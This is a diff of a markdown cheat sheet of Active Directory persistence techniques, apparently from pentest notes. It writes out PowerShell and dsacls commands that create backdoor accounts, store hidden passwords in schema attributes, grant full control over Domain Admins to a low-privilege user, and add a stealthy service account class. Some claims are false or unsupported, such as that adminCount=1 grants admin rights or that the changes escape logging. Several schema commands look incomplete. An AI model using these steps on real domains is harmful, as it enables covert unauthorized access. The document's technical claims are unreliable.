@@ -84,38 +84,38 @@ Forge a `Golden Ticket`:
     Set-ADUser -Identity "pentest_backdoor" -PasswordNeverExpires $true -CannotChangePassword $true
 
 #### Modify schema to store hidden passwords
-1. Create a new attribute for hidden passwords
+Create a new attribute for hidden passwords
 
     New-ADObject -Name "HiddenPassword" -Type attributeSchema -Path "CN=Schema,CN=Configuration,DC=example,DC=com"
 
-2. Assign the hidden attribute to admin accounts
+Assign the hidden attribute to admin accounts
 
     Set-ADUser -Identity "Administrator" -Replace @{HiddenPassword="SuperSecret123!"}
 
-3. Extract the hidden password later
+Extract the hidden password later
 
     Get-ADUser -Identity "Administrator" -Properties HiddenPassword
 
 --> AD logs won't track this change
 
 #### Add privileges to a user without adding them to groups
-1. Modify the adminCount attribute to make a normal user inherit admin privileges:
+Modify the adminCount attribute to make a normal user inherit admin privileges:
 
     Set-ADUser -Identity "normaluser" -Replace @{adminCount=1}
 
 This makes `normaluser` immune to security restrictions
 
-2. Backdoor object permissions using DACLs
+Backdoor object permissions using DACLs
 
     dsacls "CN=Domain Admins,CN=Users,DC=example,DC=com" /G lowprivuser:F
 
 #### Add a fake service account with unusual privileges
 This approach creates a hidden service account that has admin rights but doesn't appear in common queries.
-1. Create a new `StealthyServiceAccount` Class:
+Create a new `StealthyServiceAccount` Class:
 
     New-ADObject -Name "StealthyServiceAccount" -Type classSchema -Path "CN=Schema,CN=Configuration,DC=example,DC=com"
 
-2. Create a new service account using this class:
+Create a new service account using this class:
 
     New-ADObject -Name "backdoor_svc" -Type StealthyServiceAccount -Path "CN=Users,DC=example,DC=com"
     Set-ADUser -Identity "backdoor_svc" -Replace @{servicePrincipalName="MSSQLSvc/hidden"}
